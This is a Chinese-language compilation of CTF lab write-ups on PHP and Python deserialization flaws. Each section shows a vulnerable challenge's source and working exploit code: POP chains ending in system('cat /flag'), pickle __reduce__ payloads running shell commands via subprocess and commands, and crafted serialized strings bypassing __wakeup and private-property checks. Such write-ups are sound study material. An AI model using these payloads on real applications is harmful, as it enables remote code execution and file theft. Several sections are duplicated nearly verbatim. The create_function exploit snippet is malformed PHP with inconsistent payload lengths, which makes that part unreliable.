---
comments: true

---

# PHP 代码审计

<!-- Imported from D:\\Book\\Web\\Chapter12\12-1.md -->
### PHP 字符串序列化

话不多说，直接上题（BugKu CTF）

![](https://pic1.imgdb.cn/item/67b18b59d0e0a243d4ffc577.jpg)

打开网页登录界面，题目说登录不进去，尝试找找其他线索

![](https://pic1.imgdb.cn/item/67b18b6ed0e0a243d4ffc57a.jpg)

在 CSS 文件中找到注释

![](https://pic1.imgdb.cn/item/67b18b7fd0e0a243d4ffc582.jpg)

URL 跟上参数拿到源码

我们在 Cookie 的 BUGKU 参数中传入序列化后的值

![](https://pic1.imgdb.cn/item/67b18b8ed0e0a243d4ffc58d.jpg)

找个在线生成的网站即可

![](https://pic1.imgdb.cn/item/67b18bafd0e0a243d4ffc5a1.jpg)

BurpSuite 拦截抓包修改拿到 flag

![](https://pic1.imgdb.cn/item/67b18bbfd0e0a243d4ffc5a2.jpg)


<!-- Imported from D:\\Book\\Web\\Chapter12\12-10.md -->
### PHP 反序列化之 __toString() 魔术方法

话不多说，直接上题（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/683d938e58cb8da5c8255545.png)

打开网页给出源码

![](https://pic1.imgdb.cn/item/683d938058cb8da5c825553d.png)

```php
class GIT {
    public $username;
    public $password;
    // 初始化用户名为 'guest'，密码为 'Welcome to GITCTF!'
    public function __construct(){
        $this->username = 'guest';
        $this->password = 'Welcome to GITCTF!';
    }
    // 如果用户名为 'ZeroZone'，则输出密码；否则输出提示信息
    public function __destruct(){
        if($this->username == 'ZeroZone'){
            echo $this->password;
        }
        else{
            echo 'ZeroZone Lab new bee !';
        }
    }
}
```

```php
class ZeroZone {
    public $code;
    // 当对象被当作字符串使用时自动调用
    public function __toString(){
        if(isset($this->code)){
            eval($this->code);
            return '';
        }
        else{
            echo "代码呢？";
            return '';
        }
    }
}
```

```php
// 创建一个新的 GIT 类实例
$data = new GIT();
if(isset($_POST['data'])){
    $data = unserialize($_POST['data']);
}
```

让 `$data->username == 'ZeroZone'`，并让 `$data->password`

由于 `__destruct()` 会输出 `$data->password`，如果能让 `$data->password` 为一个 `ZeroZone` 对象，并且触发 `__toString()`，就可以执行任意代码

```php
<?php
class GIT {
    public $username;
    public $password;
}

class ZeroZone {
    public $code;
}

// 构造恶意对象链
$zero = new ZeroZone();
$zero->code = "system('cat /flag');";

$git = new GIT();
// 触发密码输出条件
$git->username = 'ZeroZone';
// 触发__toString() 方法
$git->password = $zero;

// 生成payload
echo serialize($git);
?>
```

![](https://pic1.imgdb.cn/item/683d97fb58cb8da5c82556b8.png)


<!-- Imported from D:\\Book\\Web\\Chapter12\12-11.md -->
### PHP & 引用相同内存

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/68775da758cb8da5c8b8c6aa.png)

打开靶场给出源码

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

md5 绕过很简单，科学计数法及数组绕过都可以

这才来到最关键的地方，如何在序列化前让 `$this->correct === $this->input`  呢？

我们创建 BUU 类后，重新给 $this->correct 赋值成 $this->input 的值

在 PHP 中，`&` 表示**引用赋值**，效果是：

 两个变量或者属性同时指向同一块内存，**任何一方变化，另一方立刻同步变化**

```php
<?php
class BUU {
   public $correct;
   public $input;
}

$fun = new BUU();
// 让 $b1->correct 和 $b1->input 两个属性引用同一块内存地址，即：它们两个绑定为同一个变量
$fun->input = &$fun->correct;
$res = serialize(@$fun);
echo $res;
?>
```

![](https://pic1.imgdb.cn/item/68bba70058cb8da5c881d63c.png)


<!-- Imported from D:\\Book\\Web\\Chapter12\12-2.md -->
### PHP POP 链

话不多说，直接上题（BugKu CTF）

![](https://pic1.imgdb.cn/item/67b18c0cd0e0a243d4ffc5a9.jpg)

```
__call() 魔术方法：当调用对象不存在的方法时，会触发该方法

__wakeup() 魔术方法：当对象反序列化时，会触发该方法终止脚本执行

__invoke() 魔术方法：允许对象作为函数被调用

__set() 魔术方法：当给不可访问的属性赋值时会触发

__get() 魔术方法：当访问不可访问的属性时会触发 __destruct

__construct() 构造函数：在对象被实例化后立即执行

__destruct() 魔术方法：当对象生命周期结束时自动触发

__toString() 魔术方法：当对象被当作字符串使用时自动调用
```

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class Happy{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __call($name, $arguments)
    {
        call_user_func($this->cmd, $this->content);
    }

    public function __wakeup()
    {
        die("Wishes can be fulfilled");
    }
}

class Nevv{
    private $happiness;

    public function __invoke()
    {
        return $this->happiness->check();
    }

}

class Rabbit{
    private $aspiration;
    
    public function __set($name,$val){
        return $this->aspiration->family;
    }
}

class Year{
    public $key;
    public $rabbit;

    public function __construct($key)
    {
        $this->key = $key;
    }

    public function firecrackers()
    {
        return $this->rabbit->wish = "allkill QAQ";
    }

    public function __get($name)
    {
        $name = $this->rabbit;
        $name();
    }

    public function __destruct()
    {
        if ($this->key == "happy new year") {
            $this->firecrackers();
        }else{
            print("Welcome 2023!!!!!");
        }
    }
}

if (isset($_GET['pop'])) {
    $a = unserialize($_GET['pop']);
}else {
    echo "过新年啊~过个吉祥年~";
}
?>
```

首先传入 Year 中的 $key="happy new year"

条件成立调用 firecrackers 方法

但 Rabbit 中 wish 不存在，所以调用 get 魔法方法

此时 $name() 对象被当成函数访问，类型实际上是 Rabbit 对象

但 invoke 方法实际上是调用了 Nevv

因为 check() 是个方法不存在，所以调用了 call 方法

$a 和 $b 是两个 Year 对象，$c 是一个 Rabbit 对象

它的构造函数接受 $b（另一个 Year 对象）作为参数

这意味着 Rabbit 对象 $c 会持有 $b 对象

$e 是一个 Happy 对象用于执行系统命令

将 Rabbit 对象 $c 赋值给 $a->rabbit

将 Nevv 对象 $d 赋值给 $b->rabbit

将 Nevv 对象 $d 赋值给 $b->rabbit

Year 对象的 $rabbit 属性会被赋值为 Rabbit 对象

而 Rabbit 对象的 $aspiration 属性会被赋值为 Year 对象，依此类推

```php
<?php

class Happy
{
    private $cmd = "system";
    private $content = "cat /flag";
}

class Nevv
{
    private $happiness;

    public function __construct($happiness)
    {
        $this->happiness = $happiness;
    }
}

class Rabbit
{
    private $aspiration;

    public function __construct($aspiration)
    {
        $this->aspiration = $aspiration;
    }

    public function __set($name, $val)
    {
        return @$this->aspiration->family;
    }
}

class Year
{
    public $key = "happy new year";
    public $rabbit;
}

$result = new Year();
$year1  = new Year();
$year1->rabbit = new Nevv(new Happy());
$rabbit1 = new Rabbit($year1);
$result->rabbit = $rabbit1;
$rabbit1->aspiration = 1;

$result=serialize($result);
echo urlencode($result);
```

```php
Year::__destruct()
    └── firecrackers()
         └── Rabbit::__set("wish", "allkill QAQ")
              └── aspiration->family   (aspiration 是 Year)
                   └── Year::__get("family")
                        └── this->rabbit()  (rabbit 是 Nevv)
                             └── Nevv::__invoke()
                                  └── happiness->check() (happiness 是 Happy)
                                       └── Happy::__call("check", [])
                                            └── call_user_func($cmd, $content)

```

拿到 flag

![](https://pic1.imgdb.cn/item/67b18d7bd0e0a243d4ffc5ea.jpg)


<!-- Imported from D:\\Book\\Web\\Chapter12\12-3.md -->
### PHP 个数不等绕过__wakeup()

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/67b18de9d0e0a243d4ffc65f.jpg)

打开网页给出了备份提示

![](https://pic1.imgdb.cn/item/67b1fc87d0e0a243d4ffe1e3.jpg)

扫后台发现 ZIP 文件

![](https://pic1.imgdb.cn/item/67b1fc9ad0e0a243d4ffe1e5.jpg)

下载下来打开 index.php 拿到源码（flag.php 是假的）

![](https://pic1.imgdb.cn/item/67b1fcafd0e0a243d4ffe1e6.jpg)

看到了反序列化，接下来去看 class.php

```
__wakeup 魔术方法：当对象反序列化时，会触发该方法终止脚本执行

__destruct 析构函数：当对象销毁时调用
```

```php
<?php
include 'flag.php';
 
 
error_reporting(0);
 
 
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
 
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
 
    function __wakeup(){
        $this->username = 'guest';
    }
 
    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
 
             
        }
    }
}
?>
```

我们需要传入 username = admin，password = 100，于是构造反序列化

```php
<?php
 
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
 
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
}
$a = new Name('admin', 100);
var_dump(serialize($a));
 
?>
```

还没有结束，因为类的两个属性声明为 private，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见

所以要在此基础上补上 %00 的空字符

```
%00Name%00username

%00Name%00password
```

最后是绕过 __wakeup()

当反序列化中对象属性的个数和真实的个数不等时，__wakeup() 就会被绕过，所以修改使其不相等即可

```php
?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

![](https://pic1.imgdb.cn/item/67b20117d0e0a243d4ffe291.png)


<!-- Imported from D:\\Book\\Web\\Chapter12\12-4.md -->
### PHP 反序列化字符逃逸

话不多说，直接上题

![](https://pic1.imgdb.cn/item/67b2beaad0e0a243d4001b14.png)

打开网页拿到源码

```php
<?php
// 需要以 get 方式传入f参数
$function = @$_GET['f'];

// 对 $img（形参）进行过滤，后缀不允许出现 'php','flag','php5','php4','fl1g'
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// unset() 销毁指定的变量。 
if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

// 本题的作用是将 _SESSION 的两个函数变为 post 传参
extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

// 对$_SESSION进行一些过滤
$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

首先让参数f等于 “phpinfo”，因为题目提示说这里可能会找到些东西

![](https://pic1.imgdb.cn/item/67b2bf5ed0e0a243d4001b33.png)

很明显是要读取这个文件，代码里读取文件的地方在这里

```php
if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

**反序列化字符串逃逸的原理：**

```
在构造键值的时候某些关键字被过滤掉了，但序列化后的字符串记录的长度不会因为过滤而改变，所以就会把序列化后的字符串的结构当做值的内容给读取
```

首先康康反序列化结果长啥样

```php
<?php
$_SESSION["user"] = '*';
$_SESSION['function'] = '**';
$_SESSION['img'] = base64_encode('guest_img.png');
echo serialize($_SESSION);

// a:3:{s:4:"user";s:1:"*";s:8:"function";s:2:"**";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

那么我们如果想要读取 `d0g3_f1ag.php` 文件的内容就需要令反序列化后的

```php
$_SESSION['img'] 为 d0g3_f1ag.php => ZDBnM19mMWFnLnBocA==
```

则初步反序列化内容

```php
s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";
```

再看到 `$serialize_info = filter(serialize($_SESSION));`

先经过序列化，然后在进行 `filter` 函数，也就是过滤替换操作

这样的话就很有可能会造成序列化字符串逃逸的问题

首先默认的序列化数据是

```php
a:3:{s:4:"user";s:5:"guest";s:8:"function";s:14:"highlight_file";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

这里可以控制的部分是 user 和 function 的内容

于是要利用过滤，用 user 吃掉后面的，加 `;` 闭合掉前面的键值 `function`

```
;s:8:"function";s:14:
```

之后在 function 的部分便可以写入数据控制后面的内容了

要吃掉的数据一共是 22 个，于是 user 的值为 phpphpphpphpphpphpflag

_SESSION[function] 的值为

```
;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"f";s:1:"a";}
```

这里要保证数组内的个数相等，所以要传入两个值，于是构造利用 payload

```php
_SESSION[user]=flagflagflagflagphpphp&_SESSION[function]=;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"f";s:1:"a";}
```

由于 `_SESSION` 数组有 3 个值，则需要在后面补充随便一个值即可

传入后 `$serialize_info` 的就为以下值

```php
a:3:{s:4:"user";s:22:"";s:8:"function";s:34:";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

随后再读取 `s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";`

随后大括号闭合

后面的 `";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}` 值丢弃

读取到 `d0g3_f1ag.php` 内容为

```php
<?php
$flag = 'flag in /d0g3_fllllllag';
?>
```

再依法读取 `/d0g3_fllllllag` 即可

```php
_SESSION[user]=flagflagflagflagphpphp&_SESSION[function]=;s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:1:"f";s:1:"a";}
```

![](https://pic1.imgdb.cn/item/67b30404d0e0a243d4003c54.png)


<!-- Imported from D:\\Book\\Web\\Chapter12\12-5.md -->
### Python Pickle 反序列化之 subprocess

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/67ba18c2d0e0a243d4023da3.png)

提示了源码在 /src 目录，直接访问

![](https://pic1.imgdb.cn/item/67bac035d0e0a243d40275a5.png)

```python
import builtins
import io
import sys
import uuid
from flask import Flask, request,jsonify,session
import pickle
import base64


app = Flask(__name__)

app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "")


class User:
    def __init__(self, username, password, auth='ctfer'):
        self.username = username
        self.password = password
        self.auth = auth

password = str(uuid.uuid4()).replace("-", "")
Admin = User('admin', password,"admin")

@app.route('/')
def index():
    return "Welcome to my application"


@app.route('/login', methods=['GET', 'POST'])
def post_login():
    if request.method == 'POST':

        username = request.form['username']
        password = request.form['password']


        if username == 'admin' :
            if password == admin.password:
                session['username'] = "admin"
                return "Welcome Admin"
            else:
                return "Invalid Credentials"
        else:
            session['username'] = username


    return '''
        <form method="post">
        <!-- /src may help you>
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''


@app.route('/ppicklee', methods=['POST'])
def ppicklee():
    data = request.form['data']

    sys.modules['os'] = "not allowed"
    sys.modules['sys'] = "not allowed"
    try:

        pickle_data = base64.b64decode(data)
        for i in {"os", "system", "eval", 'setstate', "globals", 'exec', '__builtins__', 'template', 'render', '\\',
                 'compile', 'requests', 'exit',  'pickle',"class","mro","flask","sys","base","init","config","session"}:
            if i.encode() in pickle_data:
                return i+" waf !!!!!!!"

        pickle.loads(pickle_data)
        return "success pickle"
    except Exception as e:
        return "fail pickle"


@app.route('/admin', methods=['POST'])
def admin():
    username = session['username']
    if username != "admin":
        return jsonify({"message": 'You are not admin!'})
    return "Welcome Admin"


@app.route('/src')
def src():
    return  open("app.py", "r",encoding="utf-8").read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=5000)
```

- `/ppicklee` 路由只支持 `POST` 方法。
- 从表单中获取 `data` 字段，并进行 Base64 解码。
- 通过 `sys.modules` 禁用 `os` 和 `sys` 模块。
- 检查反序列化数据中是否包含黑名单中的关键字，如果包含则返回错误信息。
- 如果数据通过检查，则尝试反序列化数据，成功返回 `success pickle`，失败返回 `fail pickle`

因为题目告诉了我们 flag 在 /flag下，且其 src 路由会读取文件 app.py 内容并输出

因为禁用了 os 和 sys 模块，所以我们使用另一个模块 **subprocess** 执行系统命令

```python
import pickle
import base64
import subprocess

# __reduce__ 方法: 这是 pickle 模块中的一个特殊方法，用于定义对象在序列化时的行为，它返回一个元组，包含一个可调用对象（通常是函数）及其参数
# subprocess.check_output: 这是一个函数，用于执行系统命令并返回输出
class A():
    def __reduce__(self):
        return subprocess.check_output, (["cp", "/flag", "/app/app.py"],)


a = A()
b = pickle.dumps(a)

print(base64.b64encode(b))
```

![](https://pic1.imgdb.cn/item/67bb328ed0e0a243d402bf17.png)

访问 src 目录拿到 flag

![](https://pic1.imgdb.cn/item/67bb3283d0e0a243d402bf07.png)



<!-- Imported from D:\\Book\\Web\\Chapter12\12-6.md -->
### Python Pickle 反序列化之 commands

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/67d81a8988c538a9b5bff794.png)

打开网页给出提示

![](https://pic1.imgdb.cn/item/67d81abb88c538a9b5bff798.png)

网页太多了，用脚本去找

```python
import requests

url="http://30b74212-bc6f-465c-8b60-d9aeaa215b75.node4.buuoj.cn:81/shop?page="
 
for i in range(0,2000):
    print(i)
    r=requests.get( url + str(i) )
    if 'lv6.png' in r.text:
        print (i)
        break
```

![](https://pic1.imgdb.cn/item/67d81af488c538a9b5bff79e.png)

找到后购买钱不够，修改前端代码的折扣

![](https://pic1.imgdb.cn/item/67d81b1388c538a9b5bff7a3.png)

购买后显示只能 admin 访问

![](https://pic1.imgdb.cn/item/67d81b2188c538a9b5bff7a5.png)

查看 Cookies 发现有 JWT

![](https://pic1.imgdb.cn/item/67d81b7388c538a9b5bff7ad.png)

使用工具破解密钥

![](https://pic1.imgdb.cn/item/67d81cb888c538a9b5bff7e4.png)

去在线网站生成 admin 的 JWT

![](https://pic1.imgdb.cn/item/67d81d1c88c538a9b5bff7f4.png)

替换掉刷新网页

![](https://pic1.imgdb.cn/item/67d81d0c88c538a9b5bff7f3.png)

点击后没反应，查看源代码有压缩文件

![](https://pic1.imgdb.cn/item/67d81d6788c538a9b5bff824.png)

下载后拿到源码

```python
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib
 
 
class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')
 
    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

become 参数存在 Pickle 反序列化漏洞

```python
import pickle
import urllib
import commands

# commands.getoutput 是一个函数，用于执行系统命令并返回输出
class Try(object):
    def __reduce__(self):
        return (commands.getoutput, ('cat /flag.txt',))


a = Try()
print(urllib.quote(pickle.dumps(a)))
```

替换为脚本生成的序列化代码拿到 flag

![](https://pic1.imgdb.cn/item/67d8209a88c538a9b5bff911.png)




<!-- Imported from D:\\Book\\Web\\Chapter12\12-7.md -->
### PHP Create_function() 反序列化

话不多说，直接上题（BugKu CTF）

![](https://pic1.imgdb.cn/item/6810303458cb8da5c8d2bb2b.png)

打开网页给出了源码

```php
<?php

if (isset($_GET['p'])) {
    $p = unserialize($_GET['p']);
}
show_source("index.php");

class Noteasy
{
    private $a;
    private $b;

    // 构造函数，会在类的对象在创建时自动调用
    public function __construct($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
        $this->check($a.$b);
        eval($a.$b);
    }


    // 析构函数，在对象销毁时自动调用
    public function __destruct()
    {
        $a = (string)$this->a;
        $b = (string)$this->b;
        $this->check($a.$b);
        $a("", $b);
    }


    private function check($str)
    {
        if (preg_match_all("(ls|find|cat|grep|head|tail|echo)", $str) > 0) die("You are a hacker, get out");
    }


    public function setAB($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
    }
}
```

首先，反序列化不调用构造函数

因为反序列化时通过读取对象的字节流来恢复对象的状态，而不是通过调用对象的构造函数来创建对象

所以直接来看析构函数

```php
public function __destruct()
{
    // 将属性 $a 转换为字符串
    $a = (string)$this->a;
    
    // 将属性 $b 转换为字符串
    $b = (string)$this->b;
    
    // 调用 check 方法，传入 $a 和 $b 连接后的字符串
    $this->check($a.$b);
    
    // 重点代码
    // 将 $a 作为函数调用，第一个参数为空字符串，第二个参数为 $b
    $a("", $b);
}
```

但是空的的函数不能执行，所以我们要构造一个

这里要利用 `Create_function()` 函数

```php
$func = create_function('$a, $b', 'return $a + $b;');
echo $func(2, 3); // 输出 5
```

`create_function` 实际上会在内部执行以下操作：

1. 生成一个唯一的函数名(如 `__lambda_func`)
2. 用给定的参数和代码体创建一个新函数
3. 返回这个函数名以便后续调用

构造序列化代码

```php
<?php
 
Class Noteast{
 
Private $a;
 
Private $b;
 
Public function_construct($a,$b){
 
$this->a=$a;
 
$this->b=$b;
 
}
 
$object=new Noteasy("create_function",';}highlight_file("/flag");/*;');
 
Echo serialize($object);
 
}
```

这样相当于

```php
create_function('', ';}highlight_file("/flag");/*;')
```

实际创建的代码为

```php
function __lambda_func() {
    ;}highlight_file("/flag");/*;
}
```

得到

```php
O:7:"Noteasy":2:{s:10:"Noteasya";s:15:"create_function";s:10:"Noteasyb";s:21:';}highlight_file("/flag");/*;";}
```

需要注意因为是 `private` 属性，所以不能直接使用

应该为 `\00类名\00`

```php
O:7:"Noteasy":2:{s:10:"\00Noteasy\00a";s:15:"create_function";s:10:"\00Noteasy\00b";s:29:";}highlight_file("/flag");/*";}
```

![](https://pic1.imgdb.cn/item/6810301658cb8da5c8d2bb1a.png)



<!-- Imported from D:\\Book\\Web\\Chapter12\12-8.md -->
### PHP %00 绕过 Private

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/67b18de9d0e0a243d4ffc65f.jpg)

打开网页给出了备份提示

![](https://pic1.imgdb.cn/item/67b1fc87d0e0a243d4ffe1e3.jpg)

扫后台发现 ZIP 文件

![](https://pic1.imgdb.cn/item/67b1fc9ad0e0a243d4ffe1e5.jpg)

下载下来打开 index.php 拿到源码（flag.php 是假的）

![](https://pic1.imgdb.cn/item/67b1fcafd0e0a243d4ffe1e6.jpg)

看到了反序列化，接下来去看 class.php

```
__wakeup 魔术方法：当对象反序列化时，会触发该方法终止脚本执行

__destruct 析构函数：当对象销毁时调用
```

```php
<?php
include 'flag.php';
 
 
error_reporting(0);
 
 
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
 
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
 
    function __wakeup(){
        $this->username = 'guest';
    }
 
    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
 
             
        }
    }
}
?>
```

我们需要传入 username = admin，password = 100，于是构造反序列化

```php
<?php
 
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
 
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
}
$a = new Name('admin', 100);
var_dump(serialize($a));
 
?>
```

还没有结束，因为类的两个属性声明为 private，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见

所以要在此基础上补上 `%00`

```php
%00Name%00

%00Name%00
```

最后是绕过 __wakeup()

当反序列化中对象属性的个数和真实的个数不等时，__wakeup() 就会被绕过，所以修改使其不相等即可

```php
?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

![](https://pic1.imgdb.cn/item/67b20117d0e0a243d4ffe291.png)


<!-- Imported from D:\\Book\\Web\\Chapter12\12-9.md -->
### PHP \00 绕过 Private

话不多说，直接上题（BugKu CTF）

![](https://pic1.imgdb.cn/item/6810303458cb8da5c8d2bb2b.png)

打开网页给出了源码

```php
<?php

if (isset($_GET['p'])) {
    $p = unserialize($_GET['p']);
}
show_source("index.php");

class Noteasy
{
    private $a;
    private $b;

    // 构造函数，会在类的对象在创建时自动调用
    public function __construct($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
        $this->check($a.$b);
        eval($a.$b);
    }


    // 析构函数，在对象销毁时自动调用
    public function __destruct()
    {
        $a = (string)$this->a;
        $b = (string)$this->b;
        $this->check($a.$b);
        $a("", $b);
    }


    private function check($str)
    {
        if (preg_match_all("(ls|find|cat|grep|head|tail|echo)", $str) > 0) die("You are a hacker, get out");
    }


    public function setAB($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
    }
}
```

首先，反序列化不调用构造函数

因为反序列化时通过读取对象的字节流来恢复对象的状态，而不是通过调用对象的构造函数来创建对象

所以直接来看析构函数

```php
public function __destruct()
{
    // 将属性 $a 转换为字符串
    $a = (string)$this->a;
    
    // 将属性 $b 转换为字符串
    $b = (string)$this->b;
    
    // 调用 check 方法，传入 $a 和 $b 连接后的字符串
    $this->check($a.$b);
    
    // 重点代码
    // 将 $a 作为函数调用，第一个参数为空字符串，第二个参数为 $b
    $a("", $b);
}
```

但是空的的函数不能执行，所以我们要构造一个

这里要利用 `Create_function()` 函数

```php
$func = create_function('$a, $b', 'return $a + $b;');
echo $func(2, 3); // 输出 5
```

`create_function` 实际上会在内部执行以下操作：

1. 生成一个唯一的函数名(如 `__lambda_func`)
2. 用给定的参数和代码体创建一个新函数
3. 返回这个函数名以便后续调用

构造序列化代码

```php
<?php
 
Class Noteast{
 
Private $a;
 
Private $b;
 
Public function_construct($a,$b){
 
$this->a=$a;
 
$this->b=$b;
 
}
 
$object=new Noteasy("create_function",';}highlight_file("/flag");/*;');
 
Echo serialize($object);
 
}
```

这样相当于

```php
create_function('', ';}highlight_file("/flag");/*;')
```

实际创建的代码为

```php
function __lambda_func() {
    ;}highlight_file("/flag");/*;
}
```

得到

```php
O:7:"Noteasy":2:{s:10:"Noteasya";s:15:"create_function";s:10:"Noteasyb";s:21:';}highlight_file("/flag");/*;";}
```

需要注意因为是 `private` 属性，所以不能直接使用

应该为 `\00类名\00`

```php
O:7:"Noteasy":2:{s:10:"\00Noteasy\00a";s:15:"create_function";s:10:"\00Noteasy\00b";s:29:";}highlight_file("/flag");/*";}
```

![](https://pic1.imgdb.cn/item/6810301658cb8da5c8d2bb1a.png)
